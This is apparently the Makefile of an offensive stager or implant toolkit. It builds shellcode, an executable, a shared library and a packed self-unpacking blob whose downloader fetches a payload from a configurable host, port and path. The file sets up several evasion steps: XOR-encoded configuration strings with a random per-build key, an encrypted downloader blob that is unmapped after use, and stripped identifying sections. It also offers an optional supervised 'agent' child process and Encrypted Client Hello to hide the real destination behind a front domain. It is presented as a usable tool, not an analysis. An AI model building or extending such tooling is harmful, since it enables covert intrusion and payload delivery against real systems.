CC = gcc
COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. -I../common \
								-fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
								-fno-asynchronous-unwind-tables -fvisibility=hidden -ffixed-r15

# Debug support
ifdef DEBUG
	COMMON_CFLAGS += -DDEBUG
endif

# Optional lifecycle supervision: run the agent PIC in a sacrificial child
# process and cache its ephemeral identity key across restarts.
SUPERVISE ?= 0
ifeq ($(SUPERVISE),1)
	COMMON_CFLAGS += -DSUPERVISE=1
endif
SUPERVISE_SLEEP_MIN ?= 5
SUPERVISE_SLEEP_MAX ?= 30
COMMON_CFLAGS += -DSUPERVISE_SLEEP_MIN=$(SUPERVISE_SLEEP_MIN) -DSUPERVISE_SLEEP_MAX=$(SUPERVISE_SLEEP_MAX)

# Common linker flags
LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none

# Specific linker flags
STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0
# The downloader is a position-independent blob mapped at an arbitrary address
# by the stub, so it links as its own stage at virtual address 0.
DL_LDFLAGS = $(STAGE1_LDFLAGS)

# Default configuration (can be overridden by environment variables)
DOWNLOAD_HOST ?= 127.0.0.1
DOWNLOAD_PORT ?= 8080
DOWNLOAD_PATH ?= /payload
DOWNLOAD_KEY ?= secret
MODULE_PATH ?= 
# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Transport selection: which transport_*.c to compile.
# Built-in freestanding transports: http, tcp, udp (raw syscalls, no libc).
# Add your own transport_<name>.c and select it with TRANSPORT=<name>.
TRANSPORT ?= http
TRANSPORT_SRC = transport_$(TRANSPORT).c

# dynload symbol resolution strategy (see dynload.c). Both modes resolve only
# from libc.so.6.
#   public  = dlopen/dlsym/dlclose (glibc >= 2.34)
#   libc_dl = __libc_dlopen_mode/__libc_dlsym/__libc_dlclose (glibc < 2.34)
DYNLOAD_MODE ?= public
ifeq ($(DYNLOAD_MODE), libc_dl)
  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=1
else
  DYNLOAD_MODE_CFLAG = -DDYNLOAD_MODE=0
endif

# Dynamic symbol hash table preference (see dynload.c)
#   auto = DT_HASH then DT_GNU_HASH (default)
#   sysv = DT_HASH only
#   gnu  = DT_GNU_HASH only
HASH_STYLE ?= auto
ifeq ($(HASH_STYLE), sysv)
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=1
else ifeq ($(HASH_STYLE), gnu)
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=2
else
  HASH_STYLE_CFLAG = -DDYNLOAD_HASH_STYLE=0
endif

# Optional Encrypted Client Hello (ECH) for the libssl transport only.
# ECH hides the inner SNI behind the public_name of an ECHConfigList. It needs
# an OpenSSL that exports SSL_set1_ech_config_list (OpenSSL 4.0+); on older
# libssl the stager still builds and quietly falls back to normal TLS.
#   ECH=1                 compile ECH support in
#   ECH_CONFIG=<base64>   ECHConfigList from the front domain's DNS HTTPS RR:
#                           dig +short HTTPS cdn.example.com   (value after "ech=")
# See transport_libssl.c for the full guide.
ECH ?= 0
ECH_CONFIG ?=
ifeq ($(ECH),1)
  COMMON_CFLAGS += -DMALLEABLE_ENABLE_ECH=1
  COMMON_CFLAGS += -DMALLEABLE_ECH_CONFIG='"$(ECH_CONFIG)"'
endif

# Config options
COMMON_CFLAGS += $(DYNLOAD_MODE_CFLAG) $(HASH_STYLE_CFLAG)
COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
COMMON_CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)

# Granular source selection: compile only what the selected transport needs.
#   http/tcp/udp/libssl -> raw syscall sockets (net_utils.c)
#   libcurl/libssl      -> runtime dynamic loader (dynload.c)
# A transport can appear in both lists (libssl opens a raw TCP socket and then
# wraps it with OpenSSL loaded at runtime).
# New transports can extend these lists or add their own dependencies.
SOCKET_TRANSPORTS := http tcp udp libssl
DYNLOAD_TRANSPORTS := libcurl libssl

# Downloader stage: a separate PIC blob (its own virtual-address space at 0)
# that the stub maps, runs, then zeroes and unmaps. It holds the transports,
# decryption and the encoded listener config, none of which must survive into
# the supervising phase.
DL_SRCS = downloader.c utils_min.c packer.c ../common/rc4.c debug.c syscalls.c
ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
  DL_SRCS += net_utils.c
endif
ifneq ($(filter $(TRANSPORT),$(DYNLOAD_TRANSPORTS)),)
  DL_SRCS += dynload.c
endif
DL_SRCS += $(TRANSPORT_SRC)

DL_TARGET = downloader
DL_BIN = downloader.bin
DL_BLOB_H = downloader_blob.h

# Stub stage: the tiny resident entry point that embeds the downloader blob and
# owns the agent lifecycle (including the supervisor).
STUB_SRCS = stub.c utils_min.c debug.c syscalls.c

STAGE0_TARGET = stager
SHELLCODE = stager.bin
SHARED_LIB = stager.so

# Self-unpacking (pluggable, mirrors the transport interface). Each unpacker
# has a stub (unpack_stub_<name>.c) and a matching packer (pack_<name>.py).
UNPACKER ?= rc4
ifeq ($(UNPACKER),rc4)
  UNPACK_SRCS = unpack_stub_rc4.c ../common/rc4.c
else
  UNPACK_SRCS = unpack_stub_$(UNPACKER).c
endif
PACK_SCRIPT = pack_$(UNPACKER).py

STUB_ELF = unpack_stub.elf
STUB_BIN = unpack_stub.bin
PACKED = stager-packed.bin

.PHONY: all raw executable executable-target so packed clean

# Default target generates raw shellcode (.bin)
all: raw

# 1. Raw shellcode (.bin)
raw: $(SHELLCODE)

$(SHELLCODE): $(STAGE0_TARGET)
	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE0_TARGET) $@
	@echo "Shellcode generated at $(PWD)/$@"
	@wc -c $@

# 2. ELF Executable (stager)
executable: $(STAGE0_TARGET)

# Downloader blob: flat PIC binary + XOR-encrypted embedding header.
$(DL_TARGET): $(DL_SRCS)
	$(CC) $(COMMON_CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)

$(DL_BIN): $(DL_TARGET)
	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(DL_TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $(DL_TARGET) $@

$(DL_BLOB_H): $(DL_BIN)
	@python3 -c "import random; \
	key = [random.randint(0, 255) for _ in range(16)]; \
	data = open('$(DL_BIN)', 'rb').read(); \
	enc = bytes(b ^ key[i % 16] for i, b in enumerate(data)); \
	print('#ifndef DOWNLOADER_BLOB_H'); \
	print('#define DOWNLOADER_BLOB_H'); \
	print('static const unsigned char downloader_key[] = { ' + ', '.join(hex(b) for b in key) + ' };'); \
	print('static const unsigned int downloader_bin_len = ' + str(len(data)) + ';'); \
	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc) + ' };'); \
	print('#endif')" > $@

$(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true

# 3. Shared Library (.so)
so: $(SHARED_LIB)

$(SHARED_LIB): $(STUB_SRCS) $(DL_BLOB_H)
	$(CC) $(COMMON_CFLAGS) -shared $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
	@echo "Shared library generated at $(PWD)/$@"
	@echo "[+] Exported symbols in $(SHARED_LIB):"
	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true

# 4. Packed self-unpacking shellcode
packed: $(PACKED)

$(STUB_ELF): $(UNPACK_SRCS) unpack_stub.ld
	$(CC) $(COMMON_CFLAGS) -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none -Wl,-e,_start -Wl,-T,unpack_stub.ld -o $@ $(UNPACK_SRCS)

# Extract the stub as a single flat binary, preserving the vaddr layout
# (including alignment padding between sections).  The old approach of
# extracting each section individually with -j and concatenating with cat
# silently dropped inter-section alignment gaps, which corrupted the .data
# header offset when .rodata was absent or differently-sized.
$(STUB_BIN): $(STUB_ELF)
	objcopy -O binary $(STUB_ELF) $@

$(PACKED): $(SHELLCODE) $(STUB_BIN) $(STUB_ELF)
	python3 $(PACK_SCRIPT) $(STUB_BIN) $(STUB_ELF) $(SHELLCODE) $(PACKED)
	@echo "Packed ($(UNPACKER)) shellcode generated at $(PWD)/$(PACKED)"
	@echo "unpacked: $$(wc -c < $(SHELLCODE)) bytes"
	@echo "packed:   $$(wc -c < $(PACKED)) bytes"

clean:
	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(SHARED_LIB) \
		$(STUB_ELF) $(STUB_BIN) $(PACKED) \
		downloader downloader.bin downloader_blob.h *.o
